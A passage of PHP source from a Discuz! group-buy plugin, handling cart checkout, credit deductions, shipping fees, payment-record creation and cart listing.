				if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
				
				$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($id);
				it618_tuan_updategoodscount($it618_tuan_sale);
				if($it618_saletype==1){
					it618_tuan_sendmessage('sale_user',$id);
				}else{
					it618_tuan_sendmessage('sale2_user',$id);
				}
				if($_GET['it618_gthdid']>0){
					it618_tuan_sendmessage('sale_shop1',$id);
				}
				it618_tuan_sendmessage('sale_shop',$id);
				it618_tuan_sendmessage('sale_admin',$id);
				
				if($it618_tuan_saleaudio=C::t('#it618_tuan#it618_tuan_saleaudio')->fetch_by_it618_shopid($it618_tuan_goods['it618_shopid'])){
					C::t('#it618_tuan#it618_tuan_saleaudio')->update($it618_tuan_saleaudio['id'],array(
						'it618_state' => 1
					));
				}else{
					C::t('#it618_tuan#it618_tuan_saleaudio')->insert(array(
						'it618_shopid' => $it618_tuan_goods['it618_shopid'],
						'it618_state' => 1
					), true);
				}
				
				echo 'it618_splitjfokit618_split'.$id;it618_tuan_delsalework();exit;
			}
			
			$saletype='0601';
			$saleid=$id;
			$out_trade_no = date("YmdHis").$saletype.$saleid;
			
			$body=$it618_tuan_goods["it618_name"];
			
			$total_fee=$yfmoney;
			
			if(tuan_is_mobile()){ 
				$wap=1;
				$url=$_G['siteurl'].it618_tuan_getrewrite('tuan_wap','uc@'.$_G['uid'],'plugin.php?id=it618_tuan:wap&pagetype=uc&payok='.$saleid,'?payok='.$saleid);
			}else{
				$wap=0;
				$url=$_G['siteurl'].it618_tuan_getrewrite('tuan_product',$pid,'plugin.php?id=it618_tuan:product&pid='.$pid.'&payok='.$saleid,'?payok='.$saleid);
			}
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
			$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
			$tmparr=explode("it618_split",$domainurl_paytype);
			$domainurl=$tmparr[0];
			$paytype=$tmparr[1];

			C::t('#it618_credits#it618_credits_salepay')->insert(array(
				'it618_out_trade_no' => $out_trade_no,
				'it618_uid' => $uid,
				'it618_saletype' => $saletype,
				'it618_saleid' => $saleid,
				'it618_paytype' => $paytype,
				'it618_url' => $url,
				'it618_body' => $body,
				'it618_total_fee' => round($total_fee,2),
				'it618_plugin' => 'it618_tuan',
				'it618_wap' => $wap,
				'it618_state' => 0,
				'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);
		
			$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
			
			
			echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;it618_tuan_delsalework();
		}else{
			echo it618_tuan_getlang('s498');it618_tuan_delsalework();exit;
		}
	}
	exit;
}


if($_GET['ac']=="gwcpay_add"){
	if($uid<=0){
		echo it618_tuan_getlang('s484');
	}else{
		$count=C::t('#it618_tuan#it618_tuan_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_tuan_lang['s1799'];exit;
		}
		set_time_limit (0);
		ignore_user_abort(true);

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_tuan_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_tuan_delsalework();
			}
		}
		C::t('#it618_tuan#it618_tuan_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		
		$tuan_gwcpcount=$it618_tuan['tuan_gwcpcount'];
		
		$count=C::t('#it618_tuan#it618_tuan_gwc')->count_by_uid($uid);
		if($count==0){
			echo it618_tuan_getlang('s1081');it618_tuan_delsalework();exit;
		}else if($count>$tuan_gwcpcount){
			echo str_replace("gwcpcount",$tuan_gwcpcount,it618_tuan_getlang('s1082'));it618_tuan_delsalework();exit;
		}
		
		foreach(C::t('#it618_tuan#it618_tuan_gwc')->fetch_all_shopid_by_uid($uid) as $shopids) {
			$it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_id($shopids['it618_shopid']);
			$shopid=$it618_tuan_shop['id'];
			$shopname=$it618_tuan_shop['it618_name'];
			$shopnamestr=str_replace("{shopname}",$shopname,it618_tuan_getlang('s1085'));
			$it618_state=$it618_tuan_shop['it618_state'];
			
			if($it618_state==0){
				echo str_replace(it618_tuan_getlang('s1086'),$shopnamestr,it618_tuan_getlang('s1087'));it618_tuan_delsalework();exit;
			}elseif($it618_state==1){
				echo str_replace(it618_tuan_getlang('s1086'),$shopnamestr,it618_tuan_getlang('s1087'));it618_tuan_delsalework();exit;
			}else{
				$it618_htstate=$it618_tuan_shop['it618_htstate'];
				if($it618_htstate==0){
					echo str_replace(it618_tuan_getlang('s1086'),$shopnamestr,it618_tuan_getlang('s1088'));it618_tuan_delsalework();exit;
				}elseif($it618_htstate==2){
					echo str_replace(it618_tuan_getlang('s1086'),$shopnamestr,it618_tuan_getlang('s1089'));it618_tuan_delsalework();exit;
				}
			}
			
			$creditnum=C::t('#it618_tuan#it618_tuan_sale')->fetch_extcredits_by_uid($it618_tuan['tuan_credit'],$it618_tuan_shop['it618_uid']);
	
			if($creditnum<$it618_tuan_shop['it618_score']){
				$shopname=$it618_tuan_shop['it618_name'];
				$tmpstr=str_replace("{shopname}",$shopname,it618_tuan_getlang('s1084'));
				$tmpstr=str_replace("{creditname}",$creditname,$tmpstr);
				echo $tmpstr;it618_tuan_delsalework();exit;
			}
			
			$quanid=intval($_GET['quanid'.$shopid]);
			if($quanid>0){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
				$it618_union_quansale = C::t('#it618_union#it618_union_quansale')->fetch_by_id($quanid);
				if(it618_union_getisokquan($it618_union_quansale)==''){
					echo 'it618_splitquanit618_split'.$it618_union_lang['s316'];it618_tuan_delsalework();exit;
				}
				
				it618_union_setquanmoney($it618_union_quansale);
			}
		}
		
		C::t('#it618_tuan#it618_tuan_gwcsale')->delete_by_gwcid_uid(0,$uid);
		$tmptime=$_G['timestamp'];$allsummoney=0;
		foreach(C::t('#it618_tuan#it618_tuan_gwc')->fetch_all_by_uid($uid) as $it618_tuan_gwc) {
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($ii1i11i[3]!='1')exit;
			
			$it618_saletype=intval($it618_tuan_gwc['it618_saletype']);
			$it618_gtypeid=intval($it618_tuan_gwc['it618_gtypeid']);
			$it618_gthdid=intval($it618_tuan_gwc['it618_gthdid']);
			$it618_tujiid=intval($it618_video_gwc['it618_tuijid']);
			$it618_count=intval($it618_tuan_gwc['it618_count']);
			$it618_kdid=intval($it618_tuan_gwc['it618_kdid']);
			
			if(!($it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id_state($it618_tuan_gwc['it618_pid'],1))){
				echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s1090');it618_tuan_delsalework();exit;
			}
			
			if($it618_tuan_goods['it618_saletype']==4){
				if(!($it618_saletype==1||$it618_saletype==2)){
					echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s1093');it618_tuan_delsalework();exit;
				}
			}else{
				if($it618_saletype!=$it618_tuan_goods['it618_saletype']){
					echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s1093');it618_tuan_delsalework();exit;
				}
			}
			
			if($it618_saletype==1){
				if($it618_tuan_goods['it618_esaletime']!=''){
					$it618_esaletime=strtotime($it618_tuan_goods['it618_esaletime'].':00');
					if($_G['timestamp']>$it618_esaletime){
						echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s488');it618_tuan_delsalework();exit;
					}
				}
			}
			
			if($it618_tuan_goods['it618_xgtype']==1){
				
				$timetmp1=explode(" ",$it618_tuan_goods['it618_xgtime1']);
				$timetmp2=explode(" ",$it618_tuan_goods['it618_xgtime2']);
				$timetmp11=explode("-",$timetmp1[0]);
				$timetmp12=explode(":",$timetmp1[1]);
				$timetmp21=explode("-",$timetmp2[0]);
				$timetmp22=explode(":",$timetmp2[1]);
				
				
				$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
				$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
				
				if($etime<$_G['timestamp']){
					echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.$it618_tuan_lang['s1055'];it618_tuan_delsalework();exit;
				}else{
					if($btime>$_G['timestamp']){
						echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.$it618_tuan_lang['s1056'];it618_tuan_delsalework();exit;
					}
				}
			}
			
			if($it618_tuan_goods['it618_xgtype']==2){
				$timetmp1=explode(" ",$it618_tuan_goods['it618_xgtime1']);
				$timetmp2=explode(" ",$it618_tuan_goods['it618_xgtime2']);
				$timetmp11=explode("-",$timetmp1[0]);
				$timetmp12=explode(":",$timetmp1[1]);
				$timetmp21=explode("-",$timetmp2[0]);
				$timetmp22=explode(":",$timetmp2[1]);
				
				$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
				$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
				
				if($etime<$_G['timestamp']){
					echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.$it618_tuan_lang['s1055'];it618_tuan_delsalework();exit;
					
				}else{
					if($btime>$_G['timestamp']){
						echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.$it618_tuan_lang['s1056'];it618_tuan_delsalework();exit;
					}else{
						$btimecur=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j'), date('Y'));
						$btimecur1=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j')+1, date('Y'));
						$etimecur=mktime($timetmp22[0], $timetmp22[1], 0, date('n'), date('j'), date('Y'));
						
						if($btimecur>$_G['timestamp']){
							echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.$it618_tuan_lang['s1056'];it618_tuan_delsalework();exit;
						}
						
						if($etimecur<$_G['timestamp']){
							echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.$it618_tuan_lang['s1056'];it618_tuan_delsalework();exit;
						}
					}
				}
			}
			
			if($it618_gtypeid>0){
				if($it618_tuan_goods_type=C::t('#it618_tuan#it618_tuan_goods_type')->fetch_by_idok($it618_gtypeid)){
					$goods_count=$it618_tuan_goods_type['it618_count'];
					$goods_price=$it618_tuan_goods_type['it618_saleprice'];
					$goods_jfid=$it618_tuan_goods_type['it618_jfid'];
					$goods_score=$it618_tuan_goods_type['it618_score'];
				}else{
					echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s1094');it618_tuan_delsalework();exit;
				}
			}else{
				$goods_count=$it618_tuan_goods['it618_count'];
				$goods_price=$it618_tuan_goods['it618_saleprice'];
				$goods_jfid=$it618_tuan_goods['it618_jfid'];
				$goods_score=$it618_tuan_goods['it618_score'];
			}
			
			if($goods_score>0){
				if(C::t('#it618_tuan#it618_tuan_jfhl')->count_by_jfid_isok($goods_jfid)==0){
					echo  'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s20');it618_tuan_delsalework();exit;
				}
			}
			
			if($IsGroup==1){
				$vipzk=it618_tuan_getvipzk($it618_tuan_gwc['it618_pid']);
			}
			
			if($vipzk>0){
				$goods_price=$goods_price*$vipzk/100;
				$goods_score=intval($goods_score*$vipzk/100);
			}
			
			if($it618_tuan_gwc['it618_price']>0){
				$goods_price=$it618_tuan_gwc['it618_price'];
			}
			
			if($it618_tuan_gwc['it618_pricescore']>0){
				$goods_score=$it618_tuan_gwc['it618_pricescore'];
			}
	
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($it618_tuan_goods['it618_xgtime']==0){
				$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_tuan_sale')." where it618_pid=".$it618_tuan_gwc['it618_pid']." and (it618_state=1 or it618_state=2 or it618_state=3) and it618_uid=".$uid);
			}else{
				$time=$_G['timestamp']-$it618_tuan_goods['it618_xgtime']*3600*24;
				
				$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_tuan_sale')." where it618_pid=".$it618_tuan_gwc['it618_pid']." and it618_time>$time and (it618_state=1 or it618_state=2 or it618_state=3) and it618_uid=".$uid);
			}
			
			if($buycount=='')$buycount=0;
			
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($it618_count<=0){
				echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s1095');it618_tuan_delsalework();exit;
			}

			if($it618_count>$goods_count){
				echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s1096');it618_tuan_delsalework();exit;
			}elseif($it618_tuan_goods['it618_xgcount']>0&&$it618_count>$it618_tuan_goods['it618_xgcount']-$buycount){
				if($it618_tuan_goods['it618_xgtime']==0){
					echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s489').$it618_tuan_goods['it618_xgcount'].it618_tuan_getlang('s490').$buycount.it618_tuan_getlang('s491');it618_tuan_delsalework();exit;
				}else{
					echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s492').$it618_tuan_goods['it618_xgtime'].it618_tuan_getlang('s493').$it618_tuan_goods['it618_xgcount'].it618_tuan_getlang('s490').$buycount.it618_tuan_getlang('s491');it618_tuan_delsalework();exit;
				}
			}
			
			$yunfeimoney=0;$yunfeiscore=0;
			if($it618_tuan_gwc['it618_kdid']>0){
				$it618_tuan_kdyunfei=C::t('#it618_tuan#it618_tuan_kdyunfei')->fetch_by_id($it618_tuan_gwc['it618_kdid']);
				if($it618_count>$it618_tuan_kdyunfei['it618_firstcount']){
					$yunfeimoney=$it618_tuan_kdyunfei['it618_firstprice']+$it618_tuan_kdyunfei['it618_price']*($it618_count-$it618_tuan_kdyunfei['it618_firstcount']);
					$yunfeiscore=$it618_tuan_kdyunfei['it618_firstscore']+$it618_tuan_kdyunfei['it618_score']*($it618_count-$it618_tuan_kdyunfei['it618_firstcount']);
					$yunfeijfid=$it618_tuan_kdyunfei['it618_jfid'];
				}else{
					$yunfeimoney=$it618_tuan_kdyunfei['it618_firstprice'];
					$yunfeiscore=$it618_tuan_kdyunfei['it618_firstscore'];
					$yunfeijfid=$it618_tuan_kdyunfei['it618_jfid'];
				}
				
				if($yunfeimoney>0&&$yunfeiscore>0){
					$yunfeijfname=$_G['setting']['extcredits'][$yunfeijfid]['title'];
					$yunfeistr='&yen;'.$yunfeimoney.'+'.$yunfeiscore.$yunfeijfname;
				}else{
					if($yunfeimoney>0){
						$yunfeistr='&yen;'.$yunfeimoney;
					}
					
					if($yunfeiscore>0){
						$yunfeijfname=$_G['setting']['extcredits'][$yunfeijfid]['title'];
						$yunfeistr=$yunfeiscore.$yunfeijfname;
						if(C::t('#it618_tuan#it618_tuan_jfhl')->count_by_jfid_isok($it618_tuan_kdyunfei['it618_jfid'])==0){
							echo 'it618_splitgidit618_split'.$it618_tuan_gwc['id'].'it618_split'.it618_tuan_getlang('s21');it618_tuan_delsalework();exit;
						}
					}
				}
			}	
			
			$summoney=$goods_price*$it618_count+$yunfeimoney;
			
			$allsummoney=$allsummoney+$summoney-$it618_tuan_gwc['it618_quanmoney'];
			
			if($goods_score>0){
				$allsumscore[$goods_jfid]+=$goods_score*$it618_count;
			}
			
			if($yunfeiscore>0){
				$allsumscore[$yunfeijfid]+=$yunfeiscore;
			}
			
			$id = C::t('#it618_tuan#it618_tuan_gwcsale')->insert(array(
				'it618_gwcid' => 0,
				'it618_uid' => $uid,
				'it618_shopid' => $it618_tuan_gwc['it618_shopid'],
				'it618_pid' => $it618_tuan_gwc['it618_pid'],
				'it618_gtypeid' => $it618_gtypeid,
				'it618_gthdid' => $it618_gthdid,
				'it618_tuijid' => $it618_tuijid,
				'it618_saletype' => $it618_saletype,
				'it618_price' => $goods_price,
				'it618_jfid' => $goods_jfid,
				'it618_score' => $goods_score,
				'it618_yunfeijfid' => $yunfeijfid,
				'it618_yunfeiscore' => $yunfeiscore,
				'it618_quanmoney' => $it618_tuan_gwc['it618_quanmoney'],
				'it618_vipzk' => $vipzk,
				'it618_sfmoney' => $summoney,
				'it618_sfscore' => $goods_score*$it618_count,
				'it618_jfbl' => $it618_tuan_goods['it618_jfbl'],
				'it618_count' => $it618_count,
				'it618_kdid' => $it618_kdid,
				'it618_yunfei' => $yunfeimoney,
				'it618_name' => it618_tuan_utftogbk($_GET["it618_name"]),
				'it618_tel' => it618_tuan_utftogbk($_GET["it618_tel"]),
				'it618_addr' => it618_tuan_utftogbk($_GET["it618_addr"]),
				'it618_bz' => it618_tuan_utftogbk($_GET["it618_bz"]),
				'it618_isservice1' => $it618_tuan_goods['it618_isservice1'],
				'it618_isservice2' => $it618_tuan_goods['it618_isservice2'],
				'it618_isservice3' => $it618_tuan_goods['it618_isservice3'],
				'it618_bsaletime' => $it618_tuan_goods['it618_bsaletime'],
				'it618_esaletime' => $it618_tuan_goods['it618_esaletime'],
				'it618_time' => $tmptime
			), true);

		}
		
		for($i=1;$i<=8;$i++){
			if($allsumscore[$i]>0){
				$jfname=$_G['setting']['extcredits'][$i]['title'];
				
				$creditnum=C::t('#it618_tuan#it618_tuan_sale')->fetch_extcredits_by_uid($i,$uid);
				if($creditnum<$allsumscore[$i]){
					echo it618_tuan_getlang('s1111').$creditnum.$jfname.it618_tuan_getlang('s1112');it618_tuan_delsalework();exit;
				}
				$gwcscorestr.=$allsumscore[$i].$jfname.' ';
			}
		}
		
		$gwcid = C::t('#it618_tuan#it618_tuan_gwcsale_main')->insert(array(
			'it618_uid' => $uid,
			'it618_state' => 0,
			'it618_time' => $tmptime
		), true);
			
		C::t('#it618_tuan#it618_tuan_gwcsale')->update_gwcid_by_uid($gwcid,$uid);
		
		if($allsummoney==0){
			for($i=1;$i<=8;$i++){
				if($allsumscore[$i]>0){
					C::t('common_member_count')->increase($uid, array(
						'extcredits'.$i => (0-$allsumscore[$i]))
					);
				}
			}
			
			C::t('#it618_tuan#it618_tuan_gwcsale_main')->update($gwcid,array(
				'it618_moneybz' => $gwcscorestr,
				'it618_state' => 1
			));
			
			foreach(C::t('#it618_tuan#it618_tuan_gwcsale')->fetch_all_by_gwcid($gwcid) as $it618_tuan_gwcsale) {
						
				$id = C::t('#it618_tuan#it618_tuan_sale')->insert(array(
					'it618_gwcid' => $it618_tuan_gwcsale['it618_gwcid'],
					'it618_shopid' => $it618_tuan_gwcsale['it618_shopid'],
					'it618_uid' => $it618_tuan_gwcsale['it618_uid'],
					'it618_pid' => $it618_tuan_gwcsale['it618_pid'],
					'it618_gthdid' => $it618_tuan_gwcsale['it618_gthdid'],
					'it618_gtypeid' => $it618_tuan_gwcsale['it618_gtypeid'],
					'it618_tuijid' => $it618_video_gwcsale['it618_tuijid'],
					'it618_saletype' => $it618_tuan_gwcsale['it618_saletype'],
					'it618_price' => $it618_tuan_gwcsale['it618_price'],
					'it618_jfid' => $it618_tuan_gwcsale['it618_jfid'],
					'it618_score' => $it618_tuan_gwcsale['it618_score'],
					'it618_yunfeijfid' => $it618_tuan_gwcsale['it618_yunfeijfid'],
					'it618_yunfeiscore' => $it618_tuan_gwcsale['it618_yunfeiscore'],
					'it618_quanmoney' => $it618_tuan_gwcsale['it618_quanmoney'],
					'it618_vipzk' => $it618_tuan_gwcsale['it618_vipzk'],
					'it618_sfmoney' => $it618_tuan_gwcsale['it618_sfmoney'],
					'it618_sfscore' => $it618_tuan_gwcsale['it618_sfscore'],
					'it618_jfbl' => $it618_tuan_gwcsale['it618_jfbl'],
					'it618_count' => $it618_tuan_gwcsale['it618_count'],
					'it618_yunfei' => $it618_tuan_gwcsale['it618_yunfei'],
					'it618_kdid' => $it618_tuan_gwcsale['it618_kdid'],
					'it618_name' => $it618_tuan_gwcsale['it618_name'],
					'it618_tel' => $it618_tuan_gwcsale['it618_tel'],
					'it618_addr' => $it618_tuan_gwcsale['it618_addr'],
					'it618_bz' => $it618_tuan_gwcsale['it618_bz'],
					'it618_isservice1' => $it618_tuan_gwcsale['it618_isservice1'],
					'it618_isservice2' => $it618_tuan_gwcsale['it618_isservice2'],
					'it618_isservice3' => $it618_tuan_gwcsale['it618_isservice3'],
					'it618_bsaletime' => $it618_tuan_gwcsale['it618_bsaletime'],
					'it618_esaletime' => $it618_tuan_gwcsale['it618_esaletime'],
					'it618_jfid' => $it618_tuan_gwcsale['it618_jfid'],
					'it618_score' => $it618_tuan_gwcsale['it618_score'],
					'it618_state' => 1,
					'it618_time' => $it618_tuan_gwcsale['it618_time']
				), true);
				
				if($it618_tuan_gwcsale['it618_tuijid']>0){
					require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
					Union_TuiTC_Add($it618_tuan_gwcsale['it618_tuijid'],$id);
				}
				
				$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($id);

				if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
				
				if($it618_tuan_sale['it618_saletype']==1)it618_tuan_setcode($it618_tuan_sale['id']);
				if($it618_tuan_sale['it618_saletype']==3)it618_tuan_setkm($it618_tuan_sale['id']);

				if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;

				it618_tuan_updategoodscount($it618_tuan_sale);
			}
			
			$it618_tuan_gwcsale_main = C::t('#it618_tuan#it618_tuan_gwcsale_main')->fetch_by_id($gwcid);
			
			C::t('#it618_tuan#it618_tuan_gwcsale')->delete_by_uid($it618_tuan_gwcsale_main['it618_uid']);
			C::t('#it618_tuan#it618_tuan_gwc')->delete_by_uid($it618_tuan_gwcsale_main['it618_uid']);

			it618_tuan_sendmessage('gwc_user',$it618_tuan_gwcsale_main['id']);
			foreach(C::t('#it618_tuan#it618_tuan_sale')->fetch_all_shopid_by_gwcid($it618_tuan_gwcsale_main['id']) as $shopids) {
				it618_tuan_sendmessage('gwc_shop',$it618_tuan_gwcsale_main['id'],$shopids['it618_shopid']);
				
				if($it618_tuan_saleaudio=C::t('#it618_tuan#it618_tuan_saleaudio')->fetch_by_it618_shopid($shopids['it618_shopid'])){
					C::t('#it618_tuan#it618_tuan_saleaudio')->update($it618_tuan_saleaudio['id'],array(
						'it618_state' => 1
					));
				}else{
					C::t('#it618_tuan#it618_tuan_saleaudio')->insert(array(
						'it618_shopid' => $shopids['it618_shopid'],
						'it618_state' => 1
					), true);
				}
				
			}
			it618_tuan_sendmessage('gwc_admin',$it618_tuan_gwcsale_main['id']);

			
			echo 'it618_splitjfokit618_split';it618_tuan_delsalework();exit;
		}else{
			if($_GET['paytype']==""){
				echo it618_tuan_getlang('s1069');it618_tuan_delsalework();exit;
			}
		}
		
		C::t('#it618_tuan#it618_tuan_gwcsale_main')->update($gwcid,array(
			'it618_moneybz' => $allsummoney.it618_tuan_getlang('s125').' '.$gwcscorestr
		));
		
		foreach(C::t('#it618_tuan#it618_tuan_gwc')->fetch_all_shopid_by_uid($uid) as $shopids) {
			$quanid=intval($_GET['quanid'.$shopids['it618_shopid']]);
			if($quanid>0){
				DB::query("update ".DB::table('it618_union_quansale')." set it618_gwcid=$id,it618_usetime=$tmptime,it618_state=1 where id=".$quanid);
			}
		}
		
		for($i=1;$i<=8;$i++){
			if($allsumscore[$i]>0){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$i => (0-$allsumscore[$i]))
				);
			}
		}
		
		$saletype='0602';
		$saleid=$gwcid;
		$out_trade_no = date("YmdHis").$saletype.$saleid;
		
		$body=str_replace("money",$allsummoney,$it618_tuan_lang['s1098']);
		$body=str_replace("gwcid",$gwcid,$body);
		
		$total_fee=$allsummoney;
		
		if(tuan_is_mobile()){ 
			$wap=1;
			$url=$_G['siteurl'].it618_tuan_getrewrite('tuan_wap','uc@'.$uid,'plugin.php?id=it618_tuan:wap&pagetype=uc');
		}else{
			$wap=0;
			$url=$_G['siteurl'].it618_tuan_getrewrite('tuan_gwcmysale','','plugin.php?id=it618_tuan:gwc&mysale');
		}
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
		$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
		$tmparr=explode("it618_split",$domainurl_paytype);
		$domainurl=$tmparr[0];
		$paytype=$tmparr[1];

		C::t('#it618_credits#it618_credits_salepay')->insert(array(
			'it618_out_trade_no' => $out_trade_no,
			'it618_uid' => $uid,
			'it618_saletype' => $saletype,
			'it618_saleid' => $saleid,
			'it618_paytype' => $paytype,
			'it618_url' => $url,
			'it618_body' => $body,
			'it618_total_fee' => round($total_fee,2),
			'it618_plugin' => 'it618_tuan',
			'it618_wap' => $wap,
			'it618_state' => 0,
			'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
			'it618_time' => $_G['timestamp']
		), true);
	
		$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
		
		echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;it618_tuan_delsalework();
	}
	exit;
}


if($_GET['ac']=="getgwc"){
	if($uid>0){
		$count=C::t('#it618_tuan#it618_tuan_gwc')->count_by_uid_pid_gtypeid($uid,$_GET['pid'],$_GET['gtypeid']);
		if($count>0){
			echo '2';
		}else{
			$pid=intval($_GET['pid']);
			
			if($IsGroup==1){
				$salepower=it618_tuan_groupsalepower($pid);
				if($salepower==1){
					echo it618_tuan_getlang('s1554');exit;
				}
				if($salepower==2){
					echo it618_tuan_getlang('s1555');exit;
				}
			}
		
			$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($pid);
			
			if($IsUnion==1&&$_GET['tuijcode']!=''){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
				$it618_tuijid=Union_IsTuiJoin('tuan',$pid,$_GET['tuijcode']);
			}
			
			C::t('#it618_tuan#it618_tuan_gwc')->insert(array(
				'it618_uid' => $uid,
				'it618_pid' => $pid,
				'it618_shopid' => $it618_tuan_goods['it618_shopid'],
				'it618_gtypeid' => $_GET['gtypeid'],
				'it618_gthdid' => $_GET['gthdid'],
				'it618_tuijid' => $it618_tuijid,
				'it618_count' => $_GET['it618_count'],
				'it618_saletype' => $_GET['saletype'],
				'it618_kdid' => $_GET['kdid']
			), true);
			
			$count=C::t('#it618_tuan#it618_tuan_gwc')->count_by_uid($uid);
			echo '1it618_split'.$count;
		}
	}else{
		echo $it618_tuan_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="gwclist_get"){
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	
	$count=C::t('#it618_tuan#it618_tuan_gwc')->count_by_uid($uid);
	$funname='getgwclist';
	
	$allsummoney=0;$isaddr=0;
	foreach(C::t('#it618_tuan#it618_tuan_gwc')->fetch_all_by_uid($uid) as $it618_tuan_gwc) {
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_gwc['it618_pid']);
		$it618_tuan_shop = C::t('#it618_tuan#it618_tuan_shop')->fetch_by_id($it618_tuan_goods['it618_shopid']);
		
				
		if($it618_tuan_gwc['it618_saletype']==1)$saletypestr=it618_tuan_getlang('s1099');
		if($it618_tuan_gwc['it618_saletype']==2){$saletypestr=it618_tuan_getlang('s1100');$isaddr=1;}
		if($it618_tuan_gwc['it618_saletype']==3)$saletypestr=it618_tuan_getlang('s1101');
		
		$thdstr='';
		if($it618_tuan_gwc['it618_gthdid']>0){
			$thdstr = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_it618_name_by_id($it618_tuan_gwc['it618_gthdid']);
			$thdstr='<a href="javascript:" class="saleabtn" onclick="alert(\''.$thdstr.'\')">'.$it618_tuan_lang['t342'].'</a>';
		}
		
		$it618_count=$it618_tuan_gwc['it618_count'];
		
		$gtypename='';
		if($it618_tuan_gwc['it618_gtypeid']>0){
			$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_gwc['it618_gtypeid']);
			$gtypename = '<font color="#999">'.$it618_tuan_lang['s1073'].'</font><font color=red>'.$gtypename.'</font>';
			
